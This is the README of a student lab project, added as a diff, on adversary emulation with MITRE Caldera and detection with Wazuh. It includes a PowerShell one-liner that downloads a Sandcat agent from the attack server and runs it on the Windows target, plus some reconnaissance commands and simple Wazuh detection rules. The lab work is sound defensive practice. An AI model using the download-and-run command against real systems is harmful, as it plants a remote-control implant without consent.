@@ -1,1 +1,171 @@
+# Adversary Emulation and Detection using Caldera and Wazuh
 
+## 📌 Overview
+
+This project demonstrates adversary emulation and detection using MITRE Caldera and Wazuh SIEM. The objective is to simulate attacker behavior based on MITRE ATT&CK techniques and evaluate the detection capabilities of a Security Operations Center (SOC) environment.
+
+The simulation focuses on T1566 (Phishing), where a user executes a malicious payload, triggering command execution on a Windows endpoint. Detection is performed using Wazuh by monitoring process activity and command execution.
+
+---
+
+## 🛠️ Tools Used
+
+* MITRE Caldera (Adversary Emulation)
+* Wazuh (SIEM & XDR)
+* Kali Linux (Attack Server)
+* Windows 10 (Target System)
+* VirtualBox (Virtualization)
+
+---
+
+## 🧪 Lab Setup
+
+### Network Configuration
+
+* Kali Linux IP: 192.168.56.1
+* Windows IP: 192.168.56.103
+* All machines connected via Host-Only Adapter
+
+### Components
+
+* Caldera server running on Kali Linux
+* Sandcat agent deployed on Windows machine
+* Wazuh server monitoring logs
+
+---
+
+## 🚀 Installation Steps
+
+### 1. Install Caldera
+
+```bash
+git clone --recursive https://github.com/mitre/caldera.git
+cd caldera
+python3 -m venv venv
+source venv/bin/activate
+pip install -r requirements.txt
+```
+
+### 2. Install Dependencies
+
+```bash
+sudo apt install nodejs npm golang-go -y
+```
+
+### 3. Run Caldera
+
+```bash
+python3 server.py --insecure --build --fresh
+```
+
+---
+
+## 🤖 Agent Deployment
+
+Due to missing payloads in the default setup, the Sandcat agent was manually compiled:
+
+```bash
+cd plugins/sandcat/gocat
+GOOS=windows GOARCH=amd64 go build -o sandcat.exe
+cp sandcat.exe ~/caldera/plugins/stockpile/data/payloads/
+```
+
+### Deploy Agent (Windows PowerShell)
+
+```powershell
+$server="http://192.168.56.1:8888";
+Invoke-WebRequest -Uri "$server/file/download" -Headers @{"platform"="windows";"file"="sandcat.exe"} -OutFile C:\Users\Public\agent.exe;
+Start-Process C:\Users\Public\agent.exe -ArgumentList "-server $server"
+```
+
+---
+
+## 🎯 Attack Simulation
+
+Since default adversaries were unavailable, a custom adversary was created in Caldera.
+
+### Commands Executed:
+
+* whoami
+* systeminfo
+* cmd.exe /c dir
+* powershell
+
+These simulate post-phishing activity (T1566).
+
+---
+
+## 🔎 Detection using Wazuh
+
+Custom detection rules were added:
+
+```xml
+<rule id="100100" level="10">
+  <match>powershell.exe</match>
+  <description>Possible phishing payload execution</description>
+</rule>
+
+<rule id="100101" level="8">
+  <match>cmd.exe</match>
+  <description>Command execution detected</description>
+</rule>
+```
+
+Wazuh successfully detected:
+
+* PowerShell execution
+* Command-line activity
+* System reconnaissance commands
+
+---
+
+## 📊 Results
+
+| Timestamp           | TTP   | Detection Status | Notes                         |
+| ------------------- | ----- | ---------------- | ----------------------------- |
+| 2026-04-10 17:10:12 | T1566 | Detected         | PowerShell execution detected |
+| 2026-04-10 17:11:03 | T1566 | Detected         | CMD execution detected        |
+| 2026-04-10 17:12:10 | T1566 | Not Detected     | No C2 traffic observed        |
+
+---
+
+## ⚠️ Challenges Faced
+
+* Missing stockpile adversary profiles
+* Sandcat payload not generated automatically
+* UI issues in Caldera v5
+* Dependency conflicts in Kali Linux
+
+---
+
+## ✅ Solutions
+
+* Manual payload compilation using Go
+* Custom adversary creation
+* Direct API-based agent deployment
+* Custom Wazuh rule creation
+
+---
+
+## 🧠 Conclusion
+
+The lab successfully demonstrated adversary emulation and detection using Caldera and Wazuh. While endpoint-level detection was effective, gaps in detecting advanced techniques such as command-and-control communication were identified.
+
+This highlights the importance of continuous rule tuning, improved logging, and correlation for enhancing SOC capabilities.
+
+---
+
+## 📸 Screenshots (Include in Submission)
+
+1. Agent connected in Caldera
+2. Operation execution (commands)
+3. Wazuh detection logs
+4. Custom rule configuration
+
+---
+
+## 📚 References
+
+* MITRE ATT&CK Framework
+* Caldera Documentation
+* Wazuh Documentation
